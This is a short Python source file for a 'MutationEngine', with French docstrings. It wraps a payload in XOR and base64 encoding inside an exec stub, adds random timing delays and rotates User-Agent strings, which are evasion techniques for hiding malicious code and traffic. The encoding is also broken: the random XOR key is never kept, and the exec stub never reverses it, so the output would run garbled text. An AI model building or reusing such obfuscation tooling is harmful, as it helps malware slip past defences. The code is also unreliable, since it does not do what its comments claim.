import base64
import random
import time
import sys

class MutationEngine:
    def __init__(self, config):
        self.config = config

    def obfuscate_flow(self):
        """Modifie l'ordre d'exécution et ajoute des délais aléatoires"""
        delays = [0.1, 0.3, 0.5, 1.0]
        time.sleep(random.choice(delays))
        return True

    def get_payload_variant(self, base_payload):
        """Encode le payload avec une rotation de clé"""
        # XOR simple pour la mutation
        key = random.randint(1, 255)
        encoded = ''.join(chr(ord(c) ^ key) for c in base_payload)
        b64 = base64.b64encode(encoded.encode('utf-8')).decode('ascii')
        return f"exec(__import__('base64').b64decode('{b64}').decode('utf-8'))"

    def mutate_user_agent(self):
        """Retourne un User-Agent aléatoire"""
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]
        return random.choice(agents)